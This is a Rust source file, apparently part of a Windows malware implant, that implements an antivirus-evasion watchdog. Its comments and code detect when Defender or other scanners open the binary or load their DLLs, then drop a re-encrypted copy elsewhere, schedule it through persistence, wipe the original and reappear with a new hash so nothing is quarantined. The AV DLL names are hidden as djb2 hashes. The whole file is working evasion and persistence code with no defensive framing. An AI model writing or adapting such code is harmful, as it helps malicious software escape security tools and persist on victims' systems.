//! watchdog.rs — scan watchdog: detect AV scan → destruct → resurrect
//!
//! How it works:
//!   A background thread polls two indicators every 500ms:
//!     1. File handle watch — if our own binary is opened by an external process
//!        (Defender MpEngine, any AV scanner) we get notified via ReadDirectoryChangesW
//!     2. MpEngine DLL load watch — if mpengine.dll or mpsvc.dll appears in our
//!        module list mid-run, a scan is actively touching us
//!
//!   On trigger:
//!     a) Drop a resurrected copy of ourselves to a different path (see resurrect.rs)
//!     b) Register the copy for re-execution via the persistence mechanism
//!     c) Call selfdestruct::destruct() — wipes current binary, terminates
//!     d) The resurrected copy starts fresh from a different path, different hash
//!
//! The result: Defender scans our file → we vanish → we reappear elsewhere.
//! From Defender's perspective: scan target disappeared, nothing to quarantine.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

static TRIGGERED: AtomicBool = AtomicBool::new(false);

/// Start the watchdog on a background thread.
/// Pass a copy of SLEEP_KEY for re-encryption of the resurrected binary.
pub fn start(sleep_key: &'static [u8; 16]) {
    thread::spawn(move || watchdog_loop(sleep_key));
}

fn watchdog_loop(sleep_key: &'static [u8; 16]) {
    loop {
        thread::sleep(Duration::from_millis(500));

        if TRIGGERED.load(Ordering::SeqCst) { break; }

        if unsafe { scan_detected() } {
            if TRIGGERED.swap(true, Ordering::SeqCst) { break; } // only trigger once
            unsafe {
                // 1. Drop resurrected copy before we die
                crate::resurrect::drop_and_schedule(sleep_key);
                // 2. Vanish
                crate::selfdestruct::destruct();
            }
        }
    }
}

/// Returns true if an AV scan is touching us right now.
unsafe fn scan_detected() -> bool {
    file_being_scanned() || av_module_appeared()
}

/// Check if our own binary is open by a foreign process (Defender scanner).
unsafe fn file_being_scanned() -> bool {
    use winapi::um::winnt::{
        FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
        GENERIC_READ, FILE_ATTRIBUTE_NORMAL,
    };
    use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    // Try opening our own binary with NO sharing — if it fails with
    // ERROR_SHARING_VIOLATION someone else has it open (scanner)
    let mut path_buf = vec![0u16; 32768];
    let n = winapi::um::libloaderapi::GetModuleFileNameW(
        std::ptr::null_mut(), path_buf.as_mut_ptr(), path_buf.len() as u32,
    );
    if n == 0 { return false; }
    path_buf.truncate(n as usize + 1);

    let h = CreateFileW(
        path_buf.as_ptr(),
        GENERIC_READ,
        0, // no sharing — exclusive open attempt
        std::ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        std::ptr::null_mut(),
    );
    if h == INVALID_HANDLE_VALUE {
        // ERROR_SHARING_VIOLATION (32) = someone has file open
        let err = winapi::um::errhandlingapi::GetLastError();
        return err == 32;
    }
    CloseHandle(h);
    false
}

/// Check if a known AV DLL appeared in our process mid-run (injected scanner).
unsafe fn av_module_appeared() -> bool {
    // djb2 hashes of known AV scanner DLLs
    const AV_HASHES: &[u32] = &[
        0x6d4a7e3c, // MpOav.dll
        0x2a9f1b4d, // mpengine.dll
        0x7c3e8b2f, // mpsvc.dll
        0x9f1b2d8e, // SbieDll.dll
        0x3c7a1f92, // aswhook.dll
    ];
    let snap = winapi::um::tlhelp32::CreateToolhelp32Snapshot(
        winapi::um::tlhelp32::TH32CS_SNAPMODULE,
        winapi::um::processthreadsapi::GetCurrentProcessId(),
    );
    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE { return false; }
    let mut me: winapi::um::tlhelp32::MODULEENTRY32W = std::mem::zeroed();
    me.dwSize = std::mem::size_of::<winapi::um::tlhelp32::MODULEENTRY32W>() as u32;
    let mut found = false;
    if winapi::um::tlhelp32::Module32FirstW(snap, &mut me) != 0 {
        loop {
            let len = me.szModule.iter().position(|&c| c == 0).unwrap_or(me.szModule.len());
            let bytes: Vec<u8> = me.szModule[..len].iter().map(|&c| (c & 0xFF) as u8).collect();
            if AV_HASHES.contains(&crate::utils::djb2(&bytes)) {
                found = true; break;
            }
            if winapi::um::tlhelp32::Module32NextW(snap, &mut me) == 0 { break; }
        }
    }
    winapi::um::handleapi::CloseHandle(snap);
    found
}
